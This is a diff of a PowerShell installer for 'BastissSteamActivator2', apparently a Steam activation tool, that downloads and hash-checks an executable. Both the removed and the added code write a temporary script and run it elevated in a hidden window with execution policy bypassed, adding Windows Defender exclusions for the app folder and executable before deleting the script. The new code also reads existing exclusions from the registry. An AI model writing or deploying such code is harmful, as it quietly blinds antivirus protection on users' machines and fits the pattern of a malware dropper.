@@ -20,16 +20,6 @@ function New-BsaShortcut {
         $lnk.Save()
     } catch {}
 }
-try {
-    Add-MpPreference -ExclusionPath $APP_DIR -ErrorAction Stop
-    Add-MpPreference -ExclusionPath $EXE_PATH -ErrorAction SilentlyContinue
-} catch {
-    $excl = Join-Path $env:TEMP "bsa_e_$([guid]::NewGuid().ToString('N')).ps1"
-    Set-Content -LiteralPath $excl -Value "Add-MpPreference -ExclusionPath '$APP_DIR' -Force; Add-MpPreference -ExclusionPath '$EXE_PATH' -Force" -Encoding UTF8
-    $p = Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',('"{0}"' -f $excl)) -PassThru
-    $p.WaitForExit()
-    Remove-Item -LiteralPath $excl -Force -ErrorAction SilentlyContinue
-}
 if (-not (Test-Path $APP_DIR)) { New-Item -ItemType Directory -Path $APP_DIR -Force | Out-Null }
 $tmp = Join-Path $APP_DIR "bsa_$([guid]::NewGuid().ToString('N')).exe"
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
@@ -38,14 +28,29 @@ $len = (Get-Item -LiteralPath $tmp).Length
 if ($len -lt 100000) { Remove-Item $tmp -Force; throw "Descarga incompleta" }
 $h = (Get-FileHash $tmp -Algorithm SHA256).Hash
 if ($h -ne $EXPECTED_HASH) { Remove-Item $tmp -Force; throw "Hash incorrecto ($h)" }
-try { Get-Process -Name 'BastissSteamActivator2' -ErrorAction Stop | Stop-Process -Force -ErrorAction Stop } catch {
-    if ($_.Exception.Message -match 'Acceso denegado|Access is denied') {
-        $ks = Join-Path $env:TEMP "bsa_k_$([guid]::NewGuid().ToString('N')).ps1"
-        Set-Content -LiteralPath $ks -Value "Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue | Stop-Process -Force; Start-Sleep 600" -Encoding UTF8
-        $kp = Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$ks`"") -PassThru
-        $kp.WaitForExit(15000) | Out-Null
-        Remove-Item -LiteralPath $ks -Force -ErrorAction SilentlyContinue
-    }
+$needsExcl = $false
+try {
+    $existing = @()
+    try { $existing = @((Get-MpPreference -ErrorAction SilentlyContinue).ExclusionPath) } catch {}
+    if (-not $existing -or $existing.Count -eq 0) { try { $existing = @((Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths" -ErrorAction SilentlyContinue).PSObject.Properties.Name | Where-Object { $_ -notlike 'PS*' }) } catch {} }
+    if ($existing -notcontains $APP_DIR) { $needsExcl = $true }
+    elseif ($existing -notcontains $EXE_PATH) { $needsExcl = $true }
+} catch { $needsExcl = $false }
+$needsKillElevated = $false
+$procs = Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue
+if ($procs) {
+    try { $procs | Stop-Process -Force -ErrorAction Stop; Start-Sleep -Milliseconds 500 } catch { if ($_.Exception.Message -match 'Acceso denegado|Access is denied') { $needsKillElevated = $true } }
+    if (Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue) { $needsKillElevated = $true }
+}
+if ($needsExcl -or $needsKillElevated) {
+    $elevCmd = ""
+    if ($needsExcl) { $elevCmd += "Add-MpPreference -ExclusionPath '$APP_DIR' -Force; Add-MpPreference -ExclusionPath '$EXE_PATH' -Force; " }
+    if ($needsKillElevated) { $elevCmd += "Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue | Stop-Process -Force; Start-Sleep 600; " }
+    $elevFile = Join-Path $env:TEMP "bsa_elev_$([guid]::NewGuid().ToString('N')).ps1"
+    Set-Content -LiteralPath $elevFile -Value $elevCmd -Encoding UTF8
+    $ep = Start-Process powershell -Verb RunAs -WindowStyle Hidden -ArgumentList @('-NoProfile','-ExecutionPolicy','Bypass','-File',"`"$elevFile`"") -PassThru
+    $ep.WaitForExit(20000) | Out-Null
+    Remove-Item -LiteralPath $elevFile -Force -ErrorAction SilentlyContinue
 }
 for ($i=0; $i -lt 20; $i++) { if (-not (Get-Process -Name 'BastissSteamActivator2' -ErrorAction SilentlyContinue)) { break }; Start-Sleep -Milliseconds 250 }
 try { if (Test-Path -LiteralPath $EXE_PATH) { Remove-Item -LiteralPath $EXE_PATH -Force -ErrorAction SilentlyContinue }; Start-Sleep -Milliseconds 300; Move-Item -LiteralPath $tmp -Destination $EXE_PATH -Force -ErrorAction Stop }
